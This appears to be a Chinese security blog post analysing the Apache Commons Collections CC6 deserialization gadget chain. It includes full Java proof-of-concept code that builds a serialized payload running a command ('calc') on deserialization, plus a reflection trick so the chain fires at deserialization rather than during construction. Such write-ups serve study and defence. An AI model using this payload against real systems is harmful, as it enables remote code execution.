@@ -1,0 +1,346 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title>CommonCollections6链分析 | Arcueid&#39;s BLOG</title>
+    <meta name="author" content="Arcueid" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/Arcueid.jpg" />
+    <link rel="preconnect" href="https://cdn.staticfile.net" />
+<script src="https://cdn.staticfile.net/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.net/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://cdn.staticfile.net/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://cdn.staticfile.net/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://cdn.staticfile.net/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<script src="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.js"></script>
+<script src="https://cdn.staticfile.net/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>ARCUEID&#39;S BLOG</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;ARCUEID&#39;S BLOG</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>CommonCollections6链分析</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/7/30
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ff7d73">网络安全</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #03a9f4">安全</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/java/" style="color: #00bcd4">java</a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p>前面和CC1一样<br>优点是不限制jdk版本和cc的版本</p>
+<p>先开一个<code>ChainedTransformer</code><br><img src="https://img-blog.csdnimg.cn/742f4fb0ceb143e9a7f2936f418ed278.png" alt="在这里插入图片描述"><br>然后创<code>LazyMap</code> 我们顺便执行一下避免上面写错<br><img src="https://img-blog.csdnimg.cn/3648efc3e819457db79e3214a15e9769.png" alt="在这里插入图片描述"><br>能弹计算器 没问题<br>后面就是CC6不同的地方了</p>
+<p>我们需要一个<code>TiedMapEntry</code><br>因为需要一个类调用了get方法<br>在<code>TiedMapEntry</code>的<code>getValue()</code>方法中调用了<code>get() </code>其中<code>map</code>和<code>key</code>都可控<br><img src="https://img-blog.csdnimg.cn/29ed92d267d343c5820511e1f1b17145.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/efa2a12eeaa247c989a419346e807c18.png" alt="在这里插入图片描述"><br>那么我们就需要一个类调用<code>getValue</code>方法 TiedMapEntry的hashCode方法就可以<br><img src="https://img-blog.csdnimg.cn/a95a621fed834b718b8e3733845b9cfc.png" alt="在这里插入图片描述"></p>
+<p>然后类似URLDNS的链子 我们可以知道这里可以用<code>HashMap</code>连上<br><code>HashMap</code>的<code>readObject</code>方法会调用<code>hashCode</code><br><img src="https://img-blog.csdnimg.cn/cdfc39954c9c40f3838874a228a3960f.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/cd6a4dd4898c4c2e95d355282d195346.png" alt="在这里插入图片描述"><br>至此链子结束 我们可以写出如下代码</p>
+<pre><code class="java">package org.example.CC6;
+
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.Map;
+
+public class Main &#123;
+    public static   void main(String[] args) throws ClassNotFoundException, IOException, NoSuchFieldException, IllegalAccessException &#123;
+        Transformer[] transformers = new Transformer[]&#123;
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)
+        &#125;;
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+        Map map = new HashMap();
+        Map lazyMap = LazyMap.decorate(map,chainedTransformer);
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,&quot;xxx&quot;);
+        Map map2 = new HashMap();
+        map2.put(tiedMapEntry,&quot;ccc&quot;);
+        serialize(map2);
+        unSerialize(&quot;ser.bin&quot;);
+
+
+    &#125;
+
+    public static void serialize(Object obj) throws IOException &#123;
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    &#125;
+    public static Object unSerialize(String path) throws IOException, ClassNotFoundException &#123;
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(path));
+        return ois.readObject();
+    &#125;
+&#125;
+</code></pre>
+<p>尝试执行 发现确实能弹计算器<br>但是这里存在和URLDNS一样的问题 , 就是这个计算器弹的时机是在<code>map2.put</code>的时候<br>而不是我们期望的反序列化的时候</p>
+<p>原因是HashMap在put的时候已经给整条链走完了<br><img src="https://img-blog.csdnimg.cn/a45f2a63880c4fdd90294707baa6e941.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/fcea8304eb2c4ecc86d53e572f68923b.png" alt="在这里插入图片描述"><br>因为这里的key !&#x3D; null 所以继续进了hashCode<br><img src="https://img-blog.csdnimg.cn/c2d83b6ada7d40d7add8bbbfb16257ac.png" alt="在这里插入图片描述"><br>LazyMap调用get<br><img src="https://img-blog.csdnimg.cn/db9bcf8b2d5240efb99a9c6adaa8ba27.png" alt="在这里插入图片描述"><br>然后没有<code>key</code> <code>put</code>进去了 在后面反序列化的时候就有<code>key</code>了<br>有<code>key</code>就直接<code>return map.get(key)</code>了</p>
+<p>为了避免这种情况 我们需要 让最开始传入的东西不能形成链子 就是说改LazyMap 改 TiedMapEntry 之类的的都行,只要不在反序列化前弹计算器就行<br>然后要记得给put进来的key remove掉<br>于是最终代码如下</p>
+<pre><code class="java">package org.example.CC6;
+
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.Map;
+
+public class Main &#123;
+    public static   void main(String[] args) throws ClassNotFoundException, IOException, NoSuchFieldException, IllegalAccessException &#123;
+        Transformer[] transformers = new Transformer[]&#123;
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),
+                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)
+        &#125;;
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+        Map map = new HashMap();
+        Map lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;xxx&quot;);
+        Map map2 = new HashMap();
+        map2.put(tiedMapEntry, &quot;ccc&quot;);
+        lazyMap.remove(&quot;xxx&quot;);
+        Field field = LazyMap.class.getDeclaredField(&quot;factory&quot;);
+        field.setAccessible(true);
+        field.set(lazyMap, chainedTransformer);
+
+        serialize(map2);
+        unSerialize(&quot;ser.bin&quot;);
+    &#125;
+
+
+
+    public static void serialize(Object obj) throws IOException &#123;
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    &#125;
+    public static Object unSerialize(String path) throws IOException, ClassNotFoundException &#123;
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(path));
+        return ois.readObject();
+    &#125;
+&#125;
+</code></pre>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 Arcueid&#39;s BLOG
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;Arcueid
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
